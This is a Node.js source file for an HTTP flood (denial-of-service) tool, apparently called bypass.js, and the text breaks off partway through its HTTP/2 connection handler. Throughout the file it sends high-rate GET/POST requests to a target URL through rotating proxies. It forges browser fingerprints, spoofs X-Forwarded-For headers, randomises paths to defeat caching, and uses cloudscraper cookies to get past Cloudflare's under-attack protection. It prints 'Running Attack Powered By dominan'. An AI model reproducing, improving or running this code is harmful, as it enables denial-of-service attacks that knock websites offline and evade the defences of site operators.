const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const axios = require('axios');
const { exec } = require('child_process');
const https = require('https');
const http2 = require('http2-wrapper');
const UserAgent = require('user-agents');
var colors = require("colors");
const cheerio = require('cheerio'); 
const scp = require("set-cookie-parser");
const rp = require('request-promise');
const cloudscraper = require('cloudscraper');

function get_option(flag) {
    const index = process.argv.indexOf(flag);
    return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
}

const options = [
    { flag: '--uam', value: get_option('--uam') },
    { flag: '--cdn', value: get_option('--cdn') },
    { flag: '--precheck', value: get_option('--precheck') },
    { flag: '--randpath', value: get_option('--randpath') },
    { flag: '--proxy-auth', value: get_option('--proxy-auth') },
    { flag: '--proxy-origin', value: get_option('--proxy-origin') },
    { flag: '--proxy-file', value: get_option('--proxy-file') }
];

function enabled(buf) {
    var flag = `--${buf}`;
    const option = options.find(option => option.flag === flag);

    if (option === undefined) { return false; }

    const optionValue = option.value;

    if (optionValue === "true" || optionValue === true) {
        return true;
    } else if (optionValue === "false" || optionValue === false) {
        return false;
    }

    if (!isNaN(optionValue)) {
        return parseInt(optionValue);
    }

    if (typeof optionValue === 'string') {
        return optionValue;
    }

    return false;
}

const docss = `
Usage: node bypass.js GET https://example.com/ 60 10 100 proxy.txt
`;


const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = process.argv[4];
const threads = process.argv[5];
const ratelimit = process.argv[6];
const proxyfile = process.argv[7];
const queryIndex = process.argv.indexOf('--query');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const bfmFlagIndex = process.argv.indexOf('--bfm');
const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 0;
const cookieIndex = process.argv.indexOf('--cookie');
const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
const refererIndex = process.argv.indexOf('--referer');
const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
const postdataIndex = process.argv.indexOf('--postdata');
const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;
const randrateIndex = process.argv.indexOf('--randrate');
const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;
const customHeadersIndex = process.argv.indexOf('--header');
const customHeaders = customHeadersIndex !== -1 && customHeadersIndex + 1 < process.argv.length ? process.argv[customHeadersIndex + 1] : undefined;
const cdnindex = process.argv.indexOf('--cdn');
const cdn = cdnindex !== -1 && cdnindex + 1 < process.argv.length ? process.argv[cdnindex + 1] : undefined;
const realIP = process.argv.includes('--real')
const customIPindex = process.argv.indexOf('--ip');
const customIP = customIPindex !== -1 && customIPindex + 1 < process.argv.length ? process.argv[customIPindex + 1] : undefined;
const customUAindex = process.argv.indexOf('--useragent');
const customUA = customUAindex !== -1 && customUAindex + 1 < process.argv.length ? process.argv[customUAindex + 1] : undefined;
const bwrUAIndex = process.argv.indexOf('--ua');
const bwrUA = bwrUAIndex !== -1 && bwrUAIndex + 1 < process.argv.length ? process.argv[bwrUAIndex + 1] : undefined;
const bwrCookieIndex = process.argv.indexOf('--cookie');
const bwrCookie = bwrCookieIndex !== -1 && bwrCookieIndex + 1 < process.argv.length ? process.argv[bwrCookieIndex + 1] : undefined;
const bwrIPIndex = process.argv.indexOf('--proxy');
const bwrIP = bwrIPIndex !== -1 && bwrIPIndex + 1 < process.argv.length ? process.argv[bwrIPIndex + 1] : undefined;
const forceHttpIndex = process.argv.indexOf('--httpver');
const useLegitHeaders = process.argv.includes('--legit');
const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2";
const debugMode = process.argv.includes('--debug') && forceHttp != 1;
const docs = process.argv.indexOf('--show');
const docsvalue = docs !== -1 && docs + 1 < process.argv.length ? process.argv[docs + 1] : undefined;

if (docsvalue) {
if (docsvalue.includes('docs')) {
    console.clear();
    console.log(docss);
    process.exit(1);
}
}

if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.error(`node ${process.argv[1]} --show docs`);
    process.exit(1);
}

let hcookie = '';

const url = new URL(target)
let proxy;
if (bwrIP) {
    proxy = [bwrIP];
} else if (enabled('proxy-file')) {
    proxy = fs.readFileSync(enabled('proxy-file'), 'utf8').replace(/\r/g, '').split('\n');
} else {
    proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n');
}

if (enabled('proxy-origin')) {
    proxy = proxy.filter(p => p.toLowerCase().includes(enabled('proxy-origin').toLowerCase()));
}

if (enabled('proxy-auth')) {
    const [username, password] = enabled('proxy-auth').split(':');
    proxy = proxy.map(p => {
        const [host, port] = p.split(':');
        return `${username}:${password}@${host}:${port}`;
    });
}

if (!['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT'].includes(reqmethod)) {
    console.error('Error request method only can GET/POST/HEAD/OPTIONS');
    process.exit(1);
}

if (!target.startsWith('https://') && !target.startsWith('http://')) {
    console.error('Error protocol can only https:// or http://');
    process.exit(1);
}

if (isNaN(time) || time <= 0) {
    console.error('Error invalid time format')
    process.exit(1);
}

if (isNaN(threads) || threads <= 0 || threads > 256) {
    console.error('Error threads format')
    process.exit(1);
}

if (isNaN(ratelimit) || ratelimit <= 0) {
    console.error(`Error ratelimit format`)
    process.exit(1);
}
function fetchRealCookie(target) {
    return new Promise((resolve, reject) => {
        cloudscraper.get({
            uri: target,
            resolveWithFullResponse: true,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36'
            }
        }, (error, response) => {
            if (error) return reject(error);

            const setCookie = response.headers['set-cookie'];
            if (!setCookie) return reject('[!] No set-cookie header');

            const cfCookie = setCookie;
            if (cfCookie) return resolve(cfCookie);
            else return reject('[!] cf_clearance not found');
        });
    });
}
if(realIP) {
    fetchRealCookie(target)
  .then(cookie => {
    hcookie = cookie
      console.log('=> Cookie dùng được:', cookie);
  })
  .catch(err => {
      console.error('[X] Lỗi:', err);
  });
}
 if (enabled('uam')) {
    // Use solved cookie from browser
    if (bwrCookie) {
        hcookie = bwrCookie;
    } else {
        hcookie = `cf_chl`;
    }
}
const agentbokep = new https.Agent({
    rejectUnauthorized: false
});

 if (enabled('precheck')) {
    const timeoutPromise = new Promise((resolve, reject) => {
       setTimeout(() => {
          reject(new Error('Request timed out'));
      }, 5000);
   });
  const axiosPromise = axios.get(target, {
      httpsAgent: agentbokep,
      headers: {
            'User-Agent': bwrUA || customUA || generateUserAgent()
        }
  });
  Promise.race([axiosPromise, timeoutPromise])
    .then((response) => {
      console.clear();
      console.log('Running Attack Powered By dominan');
      const { status, data } = response;
      console.log(`> Precheck: ${status}`);
    })
    .catch((error) => {
      if (error.message === 'Request timed out') {
        console.clear();
        console.log('Running Attack Powered By dominan');
        console.log(`> Precheck: Request Timed Out`);
      } else if (error.response) {
        console.clear();
        console.log('Running Attack Powered By dominan');
        console.log(`> Precheck: ${error.response.status}`);
      } else {
        console.clear();
        console.log('Running Attack Powered By dominan');
        console.log(`> Precheck: ${getCurrentTime()} ${error.message}`);
      }
    });
}

const randpathEnabled = enabled('randpath');
const timestampString1 = timestamp.toString().substring(0, 10);
const pathValue = randpathEnabled
  ? (Math.random() < 1 / 100000
      ? `${url.pathname}?__cf_chl_rt_tk=${randstrr(30)}_${randstrr(12)}-${timestampString}-0-gaNy${randstrr(8)}`
      : `${url.pathname}?${generateRandomString(6, 7)}&${generateRandomString(6, 7)}`
    )
  : target.path;

if (cookieValue) {
    if (cookieValue === '%RAND%') {
        hcookie = hcookie ? `${hcookie}; ${ememmmmmemmeme(6, 6)}` : ememmmmmemmeme(6, 6);
    } else {
        hcookie = cookieValue;
    }
}

function getRandomUserAgent() {
   const osList = ['Windows NT 10.0', 'Windows NT 6.1', 'Windows NT 6.3', 'Macintosh', 'Android', 'Linux'];
   const browserList = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera'];
   const languageList = ['en-US', 'en-GB', 'fr-FR', 'de-DE', 'es-ES'];
   const countryList = ['US', 'GB', 'FR', 'DE', 'ES'];
   const manufacturerList = ['Apple', 'Google', 'Microsoft', 'Mozilla', 'Opera Software'];
   const os = osList[Math.floor(Math.random() * osList.length)];
   const browser = browserList[Math.floor(Math.random() * browserList.length)];
   const language = languageList[Math.floor(Math.random() * languageList.length)];
   const country = countryList[Math.floor(Math.random() * countryList.length)];
   const manufacturer = manufacturerList[Math.floor(Math.random() * manufacturerList.length)];
   const version = Math.floor(Math.random() * 100) + 1;
   const randomOrder = Math.floor(Math.random() * 6) + 1;
   const userAgentString = `${manufacturer}/${browser} ${version}.${version}.${version} (${os}; ${country}; ${language})`;
   const encryptedString = btoa(userAgentString);
   let finalString = '';
   for (let i = 0; i < encryptedString.length; i++) {
     if (i % randomOrder === 0) {
       finalString += encryptedString.charAt(i);
     } else {
       finalString += encryptedString.charAt(i).toUpperCase();
     }
   }
   return finalString;
 }

const browserNames = Array.from({ length: 100 }, (_, i) => `Browser${i + 1}`);
const browserVersions = Array.from({ length: 100 }, (_, i) => `${i + 1}.0`);
const operatingSystems = ["Linux", "Windows", "macOS", "Android", "iOS", "FreeBSD", "OpenBSD", "NetBSD", "Solaris", "AIX", "QNX", "Haiku", "ReactOS", "ChromeOS", "AmigaOS", "BeOS", "MorphOS", "OS/2", "Minix", "Unix", "IRIX", "Kocak", "LOL", "test"];
const deviceNames = Array.from({ length: 100 }, (_, i) => `Device${i + 1}`);
const renderingEngines = Array.from({ length: 80 }, (_, i) => `Engine${i + 1}`);
const engineVersions = Array.from({ length: 80 }, (_, i) => `${i + 1}.0`);
const customFeatures = Array.from({ length: 50 }, (_, i) => `Feature${i + 1}`);
const featureVersions = Array.from({ length: 80 }, (_, i) => `${i + 1}.0`);
const cplist = [
"ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES",
"ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES",
"ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES",
"ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES",
"ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES",
"ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES" ];
 ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'], ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
process.on('uncaughtException', function(e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];

function generateUserAgent() {
    return `${getRandomElement(browserNames)}/${getRandomElement(browserVersions)} (${getRandomElement(deviceNames)}; ${getRandomElement(operatingSystems)}) ${getRandomElement(renderingEngines)}/${getRandomElement(engineVersions)} (KHTML, like Gecko) ${getRandomElement(customFeatures)}/${getRandomElement(featureVersions)}`;
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];

const statusesQ = []
let statuses = {}
let isFull = process.argv.includes('--full');
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let timer = 0;

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9)
    frame.writeUInt32BE(payload.length << 8 | type, 0)
    frame.writeUInt8(flags, 4)
    frame.writeUInt32BE(streamId, 5)
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload])
    return frame
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0)
    const length = lengthAndType >> 8
    const type = lengthAndType & 0xFF
    const flags = data.readUint8(4)
    const streamId = data.readUInt32BE(5)
    const offset = flags & 0x20 ? 5 : 0

    let payload = Buffer.alloc(0)

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length)

        if (payload.length + offset != length) {
            return null
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    }
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length)
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6)
        data.writeUInt32BE(settings[i][1], i * 6 + 2)
    }
    return data
}

function encodeRstStream(streamId, type, flags) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0);
    frameHeader.writeUInt8(type, 4);
    frameHeader.writeUInt8(flags, 5);
    frameHeader.writeUInt32BE(streamId, 5);
    const statusCode = Buffer.alloc(4).fill(0);
    return Buffer.concat([frameHeader, statusCode]);
}

const getRandomChar = () => {
    const pizda4 = 'abcdefghijklmnopqrstuvwxyz';
    const randomIndex = Math.floor(Math.random() * pizda4.length);
    return pizda4[randomIndex];
};

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

if (url.pathname.includes("%RAND%")) {
    const randomValue = randstr(6) + "&" + randstr(6);
    url.pathname = url.pathname.replace("%RAND%", randomValue);
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function ememmmmmemmeme(minLength, maxLength) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}


const headerBuilder = {
    userAgent: [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edge/12.0",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edge/12.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edge/12.0",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edge/12.0",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edge/12.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edge/12.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edge/12.0",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edge/12.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edge/12.0",
    ],

    acceptLang: [
        'ko-KR',
        'en-US',
        'zh-CN',
        'zh-TW',
        'ja-JP',
        'en-GB',
        'en-AU',
        'en-GB,en-US;q=0.9,en;q=0.8',
        'en-GB,en;q=0.5',
        'en-CA',
        'en-UK, en, de;q=0.5',
        'en-NZ',
        'en-GB,en;q=0.6',
        'en-ZA',
        'en-IN',
        'en-PH',
        'en-SG',
        'en-HK',
        'en-GB,en;q=0.8',
        'en-GB,en;q=0.9',
        'en-GB,en;q=0.7',
    ],

    acceptEncoding: [
        'gzip, deflate, br',
        'gzip, br',
        'deflate',
        'gzip, deflate, lzma, sdch',
        'deflate'
    ],

    accept: [
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    ],

    Sec: {
        dest: ['image', 'media', 'worker'],
        site: ['none', ],
        mode: ['navigate', 'no-cors']
    },

    Custom: {
        dnt: ['0', '1'],
        ect: ['3g', '2g', '4g'],
        downlink: ['0', '0.5', '1', '1.7'],
        rtt: ['510', '255'],
        devicememory: ['8', '1', '6', '4', '16', '32'],
        te: ['trailers', 'gzip'],
        version: ['Win64; x64', 'Win32; x32']
    }
}

function buildRequest() {
    const browserVersion = getRandomInt(120, 123);
    const fwfw = ['Google Chrome', 'Brave', 'Yandex'];
    const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
    let brandValue;
    if (browserVersion === 120) {
        brandValue = `"Not_A Brand";v="8", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    } else if (browserVersion === 121) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
    } else if (browserVersion === 122) {
        brandValue = `"Chromium";v="${browserVersion}", "Not(A:Brand";v="24", "${wfwf}";v="${browserVersion}"`;
    } else if (browserVersion === 123) {
        brandValue = `"${wfwf}";v="${browserVersion}", "Not:A-Brand";v="8", "Chromium";v="${browserVersion}"`;
    }
    const isBrave = wfwf === 'Brave';
    const acceptHeaderValue = isBrave
        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
    const langValue = isBrave ? 'en-US,en;q=0.6' : 'en-US,en;q=0.7';
    const secChUa = `${brandValue}`;
    const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6, 6) + ".net" : refererValue;

    // Đa dạng hóa path
    const randomPath = Math.random() < 0.5 ? `${url.pathname}?q=${generateRandomString(5, 10)}` : url.pathname;
    const ip = `${getRandomInt(1, 9)}.${getRandomInt(1, 9)}.${getRandomInt(1, 9)}.${getRandomInt(1, 9)}`

    let headers = `${reqmethod} ${randomPath} HTTP/2\r\n` +
        `Accept: ${acceptHeaderValue}\r\n` +
        'Accept-Encoding: gzip, deflate, br, zstd\r\n' +
        `Accept-Language: ${langValue}\r\n` +
        'Cache-Control: no-cache\r\n' +
        'Pragma: no-cache\r\n' +
        `X-Forwarded-For: ${ip}\r\n` +
        `X-Real-IP: ${ip}\r\n` +
        'Connection: keep-alive\r\n' +
        `Host: ${url.hostname}\r\n` +
        'Sec-Fetch-Dest: document\r\n' +
        'Sec-Fetch-Mode: navigate\r\n' +
        'Sec-Fetch-Site: none\r\n' +
        'Sec-Fetch-User: ?1\r\n' +
        'Upgrade-Insecure-Requests: 1\r\n' +
        `User-Agent: ${generateUserAgent()}\r\n` + // Đa dạng hóa User-Agent
        `sec-ch-ua: ${secChUa}\r\n` +
        'sec-ch-ua-mobile: ?0\r\n' +
        `DNT: ${getRandomElement(headerBuilder.Custom.dnt)}\r\n` +
        `RTT: ${getRandomElement(headerBuilder.Custom.rtt)}\r\n` +
        `Downlink: ${getRandomElement(headerBuilder.Custom.downlink)}\r\n` +
        `Device-Memory: ${getRandomElement(headerBuilder.Custom.devicememory)}\r\n` +
        `Ect: ${getRandomElement(headerBuilder.Custom.ect)}\r\n` +
        `TE: ${getRandomElement(headerBuilder.Custom.te)}\r\n` +
        `sec-ch-ua-arch: x86\r\n` +
        `sec-ch-ua-bitness: 64\r\n` +
        `Service-Worker-Navigation-Preload: true\r\n` +
        'sec-ch-ua-platform: "Windows"\r\n' +
        'sec-ch-ua-platform-version: "15.0.0"\r\n' +
        `sec-ch-ua-full-version: '${browserVersion}.0.6367.118'\r\n\r\n`;

    if (hcookie) {
        headers += `Cookie: ${hcookie}\r\n`;
    }
    if (currentRefererValue) {
        headers += `Referer: ${currentRefererValue}\r\n`;
    }
    headers += '\r\n';

    const mmm = Buffer.from(`${headers}`, 'binary');
    return mmm;
}

const http1Payload = Buffer.concat(new Array(1).fill(buildRequest()))

function go() {
    var [proxyHost, proxyPort] = '1.1.1.1:3128';

    if(customIP) {
        [proxyHost, proxyPort] = customIP.split(':');
    } else {
        [proxyHost, proxyPort] = proxy[~~(Math.random() * proxy.length)].split(':');
    }

    let tlsSocket;

    if (!proxyPort || isNaN(proxyPort)) {
        go()
        return
    }

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: ['h2', 'http/1.1'],
                servername: url.host,
                ciphers: [
                    'TLS_AES_128_GCM_SHA256',
                    'TLS_AES_256_GCM_SHA384',
                    'TLS_CHACHA20_POLY1305_SHA256'
                  ].join(':'),
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                ecdhCurve: 'X25519:P-256',
            }, () => {
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {

                    if (forceHttp == 2) {
                        tlsSocket.end(() => tlsSocket.destroy())
                        return
                    }

                    function doWrite() {
                      sleep(49)
                        tlsSocket.write(http1Payload, (err) => {
                            if (!err) {
                                setTimeout(() => {
                                  sleep(1)
                                    doWrite()
                                }, isFull ? 1000 : 1000 / ratelimit)
                            } else {
                                tlsSocket.end(() => tlsSocket.destroy())
                            }
                        })
                    }
                    sleep(19)
                    doWrite()

                    tlsSocket.on('error', () => {
                        tlsSocket.end(() => tlsSocket.destroy())
                    })
                    return
                }

                if (forceHttp == 1) {
                    tlsSocket.end(() => tlsSocket.destroy())
                    return
                }

                let streamId = 1
                let data = Buffer.alloc(0)
